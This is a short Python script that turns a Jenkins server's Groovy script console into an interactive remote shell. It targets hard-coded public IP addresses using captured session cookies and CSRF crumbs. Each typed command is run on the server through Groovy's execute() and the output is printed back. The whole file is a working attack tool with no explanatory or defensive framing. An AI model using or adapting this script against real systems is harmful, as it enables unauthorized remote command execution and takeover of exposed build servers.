import requests
import re

def shell():
    ip = '54.222.206.127'
    #ip = '203.12.20.87'
    
    
    while True:

        payload = raw_input("Jenkins:~$  ")

        if payload == 'exit':
            return False
        else:    
            cookies = {
                #'JSESSIONID.845b1372': 'node011lhts7lhvt251xyghp7uz1wb92357.node0',
                'JSESSIONID.22166e54': 'node07lhyblj4jmz7n6cxn7od2gop1541.node0',

                'screenResolution': '1366x768',
            }

            headers = {
                'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Referer': 'http://%s:8080/script' % ip,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }

            data = {
            'script': 'def process = "%s".execute()\r\nprintln "Found text ${process.text}"' % payload,
            #'Jenkins-Crumb': '32fd5a915490936c0d54fb008bd70120',
            'Jenkins-Crumb': '5632fda976931a6b51870ec5c138dc57',
            'json': '{"script": "def process = \\"%s\\".execute()\\nprintln \\"Found text ${process.text}\\"", "": "def process = \\"%s\\".execute()\\nprintln \\"Found text ${process.text}\\"", "Jenkins-Crumb": "32fd5a915490936c0d54fb008bd70120"}' % (payload, payload),
            'Submit': 'Run'
            }

            response = requests.post('http://%s:8080/script' % ip, headers=headers, cookies=cookies, data=data)
            text = response.text
            a = 'Found text '
            b = '</pre>'
            c = text.split(a)[-1].split(b)[0]
            print('\n' + c)

shell()